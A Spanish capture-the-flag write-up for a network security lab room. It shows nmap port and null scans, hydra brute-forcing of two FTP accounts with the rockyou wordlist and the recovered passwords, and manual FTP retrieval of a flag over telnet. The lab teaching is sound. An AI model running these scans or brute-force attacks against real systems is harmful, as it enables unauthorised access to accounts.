---
Titulo: Net Sec Challenge
Fecha: 10/09/2025
categoria:
  - NET
Dificultad_oficial: Media
Dificultad_percibida: Fácil
Estado: Terminado
---
## 1. Descripción del reto
Este es un reto que nos ponen después de una serie de salas de reconocimiento de objetivos, lo más seguro es que aquí nos pongan a prueba todo lo que se ha enseñado anteriormente y cito:

> have acquired in the Network Security module

Además nos dicen que:

> can be solved using only `nmap`, `telnet`, and `hydra`

A si que ahora tenemos doble reto que completar.
Para ser sinceros tengo ganas de ver si esta sala me puede plantear algún reto serio que me cueste resolver...
## 2. Enumeración / Reconocimiento
Como siempre en este estilo de retos vamos a empezar con un escaneo de puertos básico, con la herramienta `nmap`.
```shell
root@ip-10-10-87-78:~# nmap -sS -sV -p- -sC 10.10.130.12
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-10 13:27 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.10.130.12
Host is up (0.00073s latency).
Not shown: 65529 closed ports
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
80/tcp    open  http        lighttpd
|_http-server-header: lighttpd THM{web_server_25352}
|_http-title: Hello, world!
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
8080/tcp  open  http        Node.js (Express middleware)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
10021/tcp open  ftp         vsftpd 3.0.5
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port22-TCP:V=7.80%I=7%D=9/10%Time=68C16ED6%P=x86_64-pc-linux-gnu%r(NULL
SF:,2A,"SSH-2\.0-OpenSSH_8\.2p1\x20THM{946219583339}\x20\r\n");
MAC Address: 02:94:2D:33:A1:43 (Unknown)
Service Info: OS: Unix

Host script results:
|_clock-skew: -1s
|_nbstat: NetBIOS name: IP-10-10-130-12, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-09-10T12:28:10
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.56 seconds
```

Vale, primero que nada me veo en la necesidad de explicar un poco el comando que use.
- Primero que nada, porque ¿"`-sV`"?, porque en las anteriores tareas, he visto como me piden la versión de la cosas y para adelantar posibles cosas pienso que ha sido de utilidad.
- Segundo, porque use "`-p-`", esto lo hice debido a que en la preguntas (De arriba hacia abajo, 1 y 2) me preguntan sobre todos los puertos, por lo que será más fácil si escaneo todos de una sola vez.
- Tercero, porque use "`-sC`", principalmente para sacar información relevante sobre la máquina.

Como resultado, esos comandos me dado la respuesta a 6 de 8 preguntas.
## 3. Explotación / Desarrollo
Ahora, como ya no parece que podamos sacar más información, en la 7ª pregunta nos dicen que han encontrado dos usuarios con ingeniería social, esto lo vamos a usar a nuestro favor y como nos dicen vamos tener que entrar en el puerto FTP, pero para ello vamos a necesitar una contraseña para ambos usuarios, para esto vamos a usar los comandos:

```shell
root@ip-10-10-87-78:~# hydra -l eddie -P /usr/share/wordlists/rockyou.txt 10.10.130.12 ftp -s 10021
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-10 13:35:14
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://10.10.130.12:10021/
[10021][ftp] host: 10.10.130.12   login: eddie   password: jordan
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-10 13:35:37
root@ip-10-10-87-78:~# hydra -l quinn -P /usr/share/wordlists/rockyou.txt 10.10.130.12 ftp -s 10021
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-10 13:35:47
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://10.10.130.12:10021/
[10021][ftp] host: 10.10.130.12   login: quinn   password: andrea
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-10 13:35:59
```

Gracias a esto ya tenemos la contraseña de ambos usuarios, ahora vamos a entrar haber que información encontramos.

>[!tip] Como recomendación que me he dado cuenta a futuro si se quiere hacer en un solo comando de ver las contraseñas de los usuarios, podemos usar "`-L`" junto con la lista de usuarios.

Vale, ahora vamos a ir por lo "Dificil" de este doble reto ;), hacer lo que queda con solo telnet.
Para ello tendremos que manejarnos con dos canales (Terminales) uno para datos y otro para acciones. Lo primero que hice fue ir probando con los usuarios y vi que con el usuario "quinn" pude encontrar la bandera que buscaba.

Sesión 1:
```shell
root@ip-10-10-195-54:~# telnet 10.10.130.12 10021
Trying 10.10.130.12...
Connected to 10.10.130.12.
Escape character is '^]'.
220 (vsFTPd 3.0.5)
USER quinn
331 Please specify the password.
PASS andrea
230 Login successful.
PASV
227 Entering Passive Mode (10,10,130,12,117,202).
LIST
150 Here comes the directory listing.
226 Directory send OK.
```
Sesión 2:
```shell
root@ip-10-10-195-54:~# telnet 10.10.130.12 30154
Trying 10.10.130.12...
Connected to 10.10.130.12.
Escape character is '^]'.
-rw-rw-r--    1 1002     1002           18 Sep 20  2021 ftp_flag.txt
Connection closed by foreign host.
```

>[!info] Para que funcione lo del puerto que tengo en la sesión 2 tendremos que poner la IP que hay al principio (En este caso 10.10.130.12) y los dos últimos números serán para multiplicar y sumar, en este caso el 117 (Este número dependerá del que te salga) se tendrá que multiplicar siempre por 256 y después sumarlo con el número que te ponen en mi caso 202 (Igual que el anterior, dependera del que te digan a ti) 

Ahora que ya tenemos el archivo ubicado podemos descargarlo más o menos de la misma forma

Sesión 1:
```shell
root@ip-10-10-195-54:~# telnet 10.10.130.12 10021
Trying 10.10.130.12...
Connected to 10.10.130.12.
Escape character is '^]'.
220 (vsFTPd 3.0.5)
USER quinn
331 Please specify the password.
PASS andrea
230 Login successful.
pasv
227 Entering Passive Mode (10,10,130,12,119,201).
RETR ftp_flag.txt

150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
226 Transfer complete.
```
Sesión 2:
```shell
root@ip-10-10-195-54:~# telnet 10.10.130.12 30665
Trying 10.10.130.12...
Connected to 10.10.130.12.
Escape character is '^]'.
THM{321452667098}
Connection closed by foreign host.
```

>[!info] Si se hace con "ftp (IP) (Puerto)" todo seria mucho más facil, pero nos retaron a hacerlo solo con telnet...

La última pregunta se resuelve con:
```shell
root@ip-10-10-195-54:~# nmap -sN 10.10.130.12
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-10 14:18 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.10.130.12
Host is up (0.0032s latency).
Not shown: 995 closed ports
PORT     STATE         SERVICE
22/tcp   open|filtered ssh
80/tcp   open|filtered http
139/tcp  open|filtered netbios-ssn
445/tcp  open|filtered microsoft-ds
8080/tcp open|filtered http-proxy
MAC Address: 02:94:2D:33:A1:43 (Unknown)
```
## 4. Notas y aprendizajes

- Punto fuerte: Refuerzo de conocimientos
    
- Dificultad encontrada: Utilizar únicamente telnet para sacar la flag
    
- Conceptos nuevos aprendidos: como utilizar mejor telnet respecto a comandos de FTP